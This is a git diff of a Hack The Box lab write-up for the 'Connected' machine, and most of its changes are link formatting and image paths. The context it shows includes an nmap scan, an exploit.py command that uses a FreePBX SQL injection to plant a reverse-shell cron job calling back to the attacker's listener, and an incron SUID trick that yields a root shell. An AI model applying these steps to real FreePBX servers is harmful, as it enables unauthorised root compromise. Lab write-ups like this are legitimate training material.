@@ -14,7 +14,7 @@ We kick things off with a standard `nmap` scan to identify open ports and runnin
 ```bash
 ┌──(mracherr㉿serveur)-[/tmp]
 └─$ nmap -sC -sV 10.129.24.96
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-14 16:51 +0100
+Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-06-14 16:51 +0100
 Nmap scan report for 10.129.24.96 (10.129.24.96)
 Host is up (0.076s latency).
 Not shown: 997 filtered tcp ports (no-response)
@@ -25,7 +25,7 @@ PORT    STATE SERVICE   VERSION
 |   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
 |_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
 80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
-|_http-title: Did not follow redirect to http://connected.htb/
+|_http-title: Did not follow redirect to [http://connected.htb/](http://connected.htb/)
 |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
 443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
 |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
@@ -35,11 +35,11 @@ PORT    STATE SERVICE   VERSION
 | Not valid before: 2025-11-30T14:07:27
 |_Not valid after:  2026-11-30T14:07:27
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
 Nmap done: 1 IP address (1 host up) scanned in 134.24 seconds
 ```
 
-We discover SSH (22), HTTP (80), and HTTPS (443) open. The web server redirects to `[http://connected.htb/](http://connected.htb/)`, revealing an Apache web server running PHP 7.4.16 on CentOS.
+We discover SSH (22), HTTP (80), and HTTPS (443) open. The web server redirects to `http://connected.htb/`, revealing an Apache web server running PHP 7.4.16 on CentOS.
 
 ---
 
@@ -47,16 +47,16 @@ We discover SSH (22), HTTP (80), and HTTPS (443) open. The web server redirects 
 
 Further enumeration of the web application reveals it is running **FreePBX 16.0.40.7**. 
 
-![FreePBX Version Identification](/assets/images/476d6f57583d385bc0d7b472ad06b51b_MD5.jpg)
-![FreePBX Dashboard](/assets/images/e87b590fd94379839873af27cbe33a1f_MD5.jpg)
+![FreePBX Version Identification](/assets/images/connected-htb/476d6f57583d385bc0d7b472ad06b51b_MD5.jpg)
+![FreePBX Dashboard](/assets/images/connected-htb/e87b590fd94379839873af27cbe33a1f_MD5.jpg)
 
 This version is vulnerable to an SQL injection that allows us to inject a malicious cron job. By firing an exploit script against the target, we successfully catch a reverse shell as the `asterisk` user.
 
 ```bash
 ┌──(mracherr㉿serveur)-[/tmp]
-└─$ python exploit.py http://connected.htb -i tun0 -p 9001
+└─$ python exploit.py [http://connected.htb](http://connected.htb) -i tun0 -p 9001
 [*] Listener address: 10.10.16.224:9001 (iface tun0)
-[*] Confirming SQLi on http://connected.htb ...
+[*] Confirming SQLi on [http://connected.htb](http://connected.htb) ...
 [+] Vulnerable! DB version: 5.5.65-MariaDB
 [*] Listening on 0.0.0.0:9001
 [*] Injecting reverse-shell cron job ...
@@ -123,7 +123,7 @@ The script includes `/var/www/html/admin/modules/freepbx_ha/functions.inc/incron
 
 This mechanism allows files to have their owner changed to root and the SUID bit (`04777` or `04755`) set!
 
-![Incron Job Execution](/assets/images/06c8eadc1b2ed0e2c6987444dac51a8e_MD5.jpg)
+![Incron Job Execution](/assets/images/connected-htb/06c8eadc1b2ed0e2c6987444dac51a8e_MD5.jpg)
 
 ### Creating the Payload
 
@@ -160,10 +160,10 @@ Once our binary `c` is on the target (e.g., in `/home/asterisk/c`), we trigger t
 
 Once the `incron` job processes our trigger, the SUID bit is successfully set on our binary:
 
-![SUID Bit Set](/assets/images/2534cae3b6d9a4e4ff0dc8a51b04ae87_MD5.jpg)
+![SUID Bit Set](/assets/images/connected-htb/2534cae3b6d9a4e4ff0dc8a51b04ae87_MD5.jpg)
 
 Finally, we execute the binary. Since it is now owned by root and has the SUID bit set, it runs with root privileges and sends a shell back to our netcat listener!
 
-![Root Shell Caught](/assets/images/1f8b5d2e90ce01ce7b2a46d70049082a_MD5.jpg)
+![Root Shell Caught](/assets/images/connected-htb/1f8b5d2e90ce01ce7b2a46d70049082a_MD5.jpg)
 
 Box completely compromised!
